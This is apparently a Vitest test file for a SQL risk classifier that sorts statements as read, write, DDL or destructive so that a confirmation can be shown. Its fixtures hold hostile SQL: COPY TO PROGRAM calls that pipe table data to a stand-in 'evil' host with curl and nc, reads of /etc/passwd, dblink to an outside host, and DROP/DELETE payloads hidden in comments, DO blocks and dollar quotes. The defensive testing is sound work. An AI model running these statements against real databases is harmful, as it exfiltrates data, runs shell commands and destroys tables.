import { describe, expect, it } from 'vitest'
import { guardSql } from '../../electron/main/services/oxequery/sql-guard'
import type { MessageCode } from '../../shared/messages'

/**
 * B10 · redesign audit #228, P1-12 and P1-13: the SQL classifier that decides what OxeQuery confirms, for the person
 * and for agents. Each case pins the risk and the reason the confirmation shows. Ratchets only: a case here may become
 * stricter, never looser.
 */
type Case = [sql: string, kind: 'read' | 'write' | 'ddl' | 'destructive', reason: RegExp | null]

/**
 * P1-12: adversarial inputs the classifier already withstood in the audit's probe (main f211ca7f). The first 22 were
 * written from #228's categories; the last three come from homologation's own probe (#184, sql-guard-probe.mts.txt).
 */
const ADVERSARIAL: Case[] = [
  ['WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d', 'destructive', /DELETE inside WITH has no WHERE clause/],
  ['WITH u AS (UPDATE users SET admin = true RETURNING *) SELECT * FROM u', 'destructive', /UPDATE inside WITH has no WHERE clause/],
  ['SELECT 1; DROP TABLE users', 'destructive', /DROP permanently removes/],
  ['SELECT 1; DELETE FROM users', 'destructive', /DELETE without a WHERE clause/],
  ['/* SELECT */ DELETE FROM users -- WHERE id = 1', 'destructive', /DELETE without a WHERE clause/],
  ["SELECT 1 /* ; */; -- DROP\n TrUnCaTe users", 'destructive', /TRUNCATE permanently removes/],
  ['DeLeTe FrOm users', 'destructive', /DELETE without a WHERE clause/],
  ['uPdAtE users SET admin = true', 'destructive', /UPDATE without a WHERE clause/],
  ['EXPLAIN ANALYZE DELETE FROM users WHERE id = 1', 'write', /EXPLAIN ANALYZE executes the statement/],
  ['EXPLAIN (ANALYZE, BUFFERS) UPDATE users SET a = 1 WHERE id = 2', 'write', /EXPLAIN ANALYZE executes the statement/],
  ["SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)", 'write', /dblink.*outside the database/],
  ["SELECT lo_export(16409, '/tmp/out')", 'write', /lo_export.*outside the database/],
  ['SELECT pg_terminate_backend(pid) FROM pg_stat_activity', 'write', /pg_terminate_backend.*outside the database/],
  ['SELECT "pg_read_file"(\'/etc/passwd\')', 'write', /pg_read_file.*outside the database/],
  ['SELECT * INTO backup FROM users', 'ddl', /SELECT INTO creates a table/],
  ['TRUNCATE users', 'destructive', /TRUNCATE permanently removes/],
  ['ALTER TABLE users DROP COLUMN email', 'destructive', /ALTER \.\.\. DROP/],
  ['GRANT ALL ON users TO PUBLIC', 'ddl', null],
  // Stricter since homologation's review of #237: the statement inside PREPARE is inspected (was write, no reason).
  ['PREPARE purge AS DELETE FROM users', 'destructive', /PREPARE contains DELETE/],
  ['EXECUTE purge', 'write', null],
  ['SELECT $q$DELETE FROM users$q$', 'read', null],
  ["SELECT 'x'';DROP TABLE users;--'", 'read', null],
  ['SET ROLE postgres', 'ddl', /changes the session user/],
  ['VACUUM FULL users', 'ddl', /locks the whole table/],
  ['-- read only\nDROP TABLE users', 'destructive', /DROP permanently removes/],
  ['PREPARE p AS DELETE FROM users; EXECUTE p', 'destructive', /PREPARE contains DELETE/]
]

/** P1-13: the cases that reached the confirmation without their worst reason. */
const NEW_REASONS: [sql: string, kind: 'write' | 'destructive', codes: MessageCode[], reason: RegExp][] = [
  ["COPY users TO PROGRAM 'curl -d @- https://evil'", 'destructive', ['oxequery.sql.copyProgram'], /PROGRAM runs a shell command on the database server/],
  ["COPY users FROM PROGRAM 'cat /etc/passwd'", 'destructive', ['oxequery.sql.copyProgram'], /shell command/],
  ["copy (select * from users) to program 'nc evil 9'", 'destructive', ['oxequery.sql.copyProgram'], /shell command/],
  ['DO $$ BEGIN DELETE FROM users; END $$', 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains DELETE/],
  ['DO $body$ BEGIN DROP TABLE audit; END $body$', 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains DROP/],
  ["DO LANGUAGE plpgsql 'BEGIN TRUNCATE users; END'", 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains TRUNCATE/],
  ['DO $$ BEGIN EXECUTE $q$TRUNCATE users$q$; END $$', 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains TRUNCATE/],
  ["DO $$ BEGIN EXECUTE 'DROP TABLE ' || quote_ident(t); END $$", 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains DROP/],
  ['DO $$ BEGIN UPDATE users SET admin = true; END $$', 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains UPDATE/],
  ["DO $$ BEGIN EXECUTE format('COPY t TO PROGRAM %L', 'id'); END $$", 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains COPY PROGRAM/],
  ['DO $a$ BEGIN EXECUTE $b$ EXECUTE $c$ EXECUTE $d$ EXECUTE $e$ SELECT 1 $e$ $d$ $c$ $b$; END $a$', 'destructive', ['oxequery.sql.doBlock', 'oxequery.sql.destructiveInside'], /DO contains nested code/],
  ['DO $$ BEGIN PERFORM 1; END $$', 'write', ['oxequery.sql.doBlock'], /DO runs code in the database/],
  ['DO $$ BEGIN UPDATE users SET a = 1 WHERE id = 2; END $$', 'write', ['oxequery.sql.doBlock'], /DO runs code in the database/],
  ['DO $$ BEGIN PERFORM * FROM users FOR UPDATE; END $$', 'write', ['oxequery.sql.doBlock'], /DO runs code in the database/],
  ['CALL purge_users()', 'write', ['oxequery.sql.callProcedure'], /CALL runs a stored procedure/],
  ["CALL run_sql('DELETE FROM users')", 'destructive', ['oxequery.sql.callProcedure', 'oxequery.sql.destructiveInside'], /CALL contains DELETE/],
  ['SELECT * FROM users WHERE id = 1 FOR UPDATE', 'write', ['oxequery.sql.rowLock'], /locks the rows/],
  ['SELECT * FROM users FOR SHARE', 'write', ['oxequery.sql.rowLock'], /locks the rows/],
  ['SELECT * FROM users FOR NO KEY UPDATE SKIP LOCKED', 'write', ['oxequery.sql.rowLock'], /locks the rows/],
  ['select * from users for key share nowait', 'write', ['oxequery.sql.rowLock'], /locks the rows/],
  ['SELECT * FROM (SELECT * FROM users FOR UPDATE) s', 'write', ['oxequery.sql.rowLock'], /locks the rows/],
  ['WITH a AS (SELECT 1) SELECT * FROM users FOR UPDATE', 'destructive', ['oxequery.sql.rowLock'], /locks the rows/],
  ['EXPLAIN ANALYZE SELECT * FROM users FOR UPDATE', 'write', ['oxequery.sql.rowLock'], /locks the rows/]
]

describe('SQL risk: adversarial inputs (#228 P1-12)', () => {
  it('keeps all 26', () => { expect(ADVERSARIAL).toHaveLength(26) })

  it.each(ADVERSARIAL)('%s', (sql, kind, reason) => {
    const verdict = guardSql(sql)
    expect(verdict.kind).toBe(kind)
    if (reason) expect(verdict.reasons.some(item => reason.test(item)), verdict.reasons.join(' | ')).toBe(true)
    else expect(verdict.reasons).toEqual([])
  })
})

describe('SQL risk: reasons the confirmation must show (#228 P1-13)', () => {
  it.each(NEW_REASONS)('%s', (sql, kind, codes, reason) => {
    const verdict = guardSql(sql)
    expect(verdict.kind).toBe(kind)
    expect(verdict.reasons.some(item => reason.test(item)), verdict.reasons.join(' | ')).toBe(true)
    expect((verdict.codes ?? []).map(message => message.code)).toEqual(codes)
  })

  it('gives role changes and VACUUM FULL a reason without changing their kind', () => {
    for (const sql of ['SET ROLE postgres', 'SET LOCAL ROLE admin', 'SET SESSION AUTHORIZATION admin', 'RESET ROLE']) {
      expect(guardSql(sql), sql).toMatchObject({ kind: 'ddl', codes: [{ code: 'oxequery.sql.sessionRole', params: {} }] })
    }
    expect(guardSql('VACUUM (FULL) users')).toMatchObject({ kind: 'ddl', codes: [{ code: 'oxequery.sql.tableLock', params: {} }] })
    expect(guardSql('SET search_path = public')).toMatchObject({ kind: 'ddl', reasons: [] })
    expect(guardSql('VACUUM users')).toMatchObject({ kind: 'ddl', reasons: [] })
  })

  it('judges the statement inside PREPARE, which the following EXECUTE runs', () => {
    expect(guardSql('PREPARE p AS DELETE FROM users; EXECUTE p')).toMatchObject({
      kind: 'destructive', statements: 2, codes: [{ code: 'oxequery.sql.destructiveInside', params: { statement: 'PREPARE', keyword: 'DELETE' } }]
    })
    expect(guardSql('PREPARE p (text) AS DROP TABLE users').kind).toBe('destructive')
    expect(guardSql("PREPARE p AS COPY users TO PROGRAM 'id'").codes?.map(message => message.code)).toEqual(['oxequery.sql.copyProgram', 'oxequery.sql.destructiveInside'])
    // No false alarm, and no loosening: a prepared read stays what it was (write, as PREPARE always was).
    expect(guardSql('PREPARE p AS SELECT 1; EXECUTE p')).toMatchObject({ kind: 'write', reasons: [] })
    // `$1` is a parameter, not a dollar quote, so the WHERE is seen.
    expect(guardSql('PREPARE p (int) AS DELETE FROM users WHERE id = $1')).toMatchObject({ kind: 'write', reasons: [] })
    expect(guardSql('PREPARE p (int, text) AS UPDATE users SET name = $2 WHERE id = $1; EXECUTE p (1, $$x$$)')).toMatchObject({ kind: 'write', reasons: [] })
  })

  it('names the statement and keyword found inside', () => {
    expect(guardSql('DO $$ BEGIN DELETE FROM users; END $$').codes).toContainEqual({ code: 'oxequery.sql.destructiveInside', params: { statement: 'DO', keyword: 'DELETE' } })
  })

  it('leaves plain COPY and look-alikes as they were', () => {
    expect(guardSql("COPY users TO '/tmp/users.csv'")).toMatchObject({ kind: 'write', reasons: [] })
    expect(guardSql('SELECT substring(name FROM 1 FOR 2) FROM users')).toMatchObject({ kind: 'read', reasons: [] })
    expect(guardSql("SELECT 'FOR UPDATE', $q$ DO $$ BEGIN DELETE FROM users; END $$ $q$ AS body")).toMatchObject({ kind: 'read', reasons: [] })
    expect(guardSql('SELECT program FROM copy_jobs').kind).toBe('read')
    expect(guardSql('EXPLAIN SELECT * FROM users FOR SHARE')).toMatchObject({ kind: 'read', reasons: [] })
    expect(guardSql('SELECT 1').codes).toBeUndefined()
  })
})

describe('SQL risk: dollar quotes', () => {
  it('reads $$ and $tag$ bodies as strings', () => {
    expect(guardSql('SELECT $$; DROP TABLE users; $$').kind).toBe('read')
    expect(guardSql('SELECT $body$; DROP TABLE users; $body$').kind).toBe('read')
  })

  it('does not open a quote right after an identifier, as Postgres does not', () => {
    // Postgres reads `foo$a$` as one identifier, so the DROP runs; it must not hide inside a fake quote.
    expect(guardSql('SELECT foo$a$ FROM t; DROP TABLE users; --$a$').kind).toBe('destructive')
    expect(guardSql('SELECT 1 AS x$$; DELETE FROM users; --$$').kind).toBe('destructive')
  })
})
